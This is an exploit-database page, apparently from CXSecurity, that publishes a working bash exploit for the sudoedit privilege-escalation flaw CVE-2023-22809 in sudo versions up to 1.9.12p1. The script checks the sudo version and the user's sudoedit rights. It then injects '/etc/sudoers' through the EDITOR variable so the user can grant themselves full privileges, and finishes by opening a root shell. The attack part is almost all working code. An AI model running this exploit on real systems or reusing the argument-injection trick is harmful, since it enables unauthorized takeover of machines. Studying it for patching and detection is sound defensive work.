---
title: sudo 1.9.12p1 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-04
fetch_date: 2025-10-04T11:29:42.238739
---

# sudo 1.9.12p1 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **sudo 1.9.12p1 Privilege Escalation** **2023.04.03**  Credit:  **[n3m1.sys](https://cxsecurity.com/author/n3m1.sys/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2023-22809](https://cxsecurity.com/cveshow/CVE-2023-22809/ "Click to see CVE-2023-22809")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

#!/usr/bin/env bash
# Exploit Title: sudo 1.8.0 to 1.9.12p1 - Privilege Escalation
# Exploit Author: n3m1.sys
# CVE: CVE-2023-22809
# Date: 2023/01/21
# Vendor Homepage: https://www.sudo.ws/
# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz
# Version: 1.8.0 to 1.9.12p1
# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9
#
# Git repository: https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc
#
# Running this exploit on a vulnerable system allows a localiattacker to gain
# a root shell on the machine.
#
# The exploit checks if the current user has privileges to run sudoedit or
# sudo -e on a file as root. If so it will open the sudoers file for the
# attacker to add a line to gain privileges on all the files and get a root
# shell.
if ! sudo --version | head -1 | grep -qE '(1\.8.\*|1\.9\.[0-9]1?(p[1-3])?|1\.9\.12p1)$'
then
echo "> Currently installed sudo version is not vulnerable"
exit 1
fi
EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E '\(root\)|\(ALL\)|\(ALL : ALL\)' | cut -d ')' -f 2-)
if [ -z "$EXPLOITABLE" ]; then
echo "> It doesn't seem that this user can run sudoedit as root"
read -p "Do you want to proceed anyway? (y/N): " confirm && [[ $confirm == [yY] ]] || exit 2
else
echo "> BINGO! User exploitable"
echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
echo "$( whoami ) ALL=(ALL:ALL) ALL"
read -n 1 -s -r -p "Press any key to continue..."
EDITOR="vim -- /etc/sudoers" $EXPLOITABLE
sudo su root
exit 0
fi

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040017)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top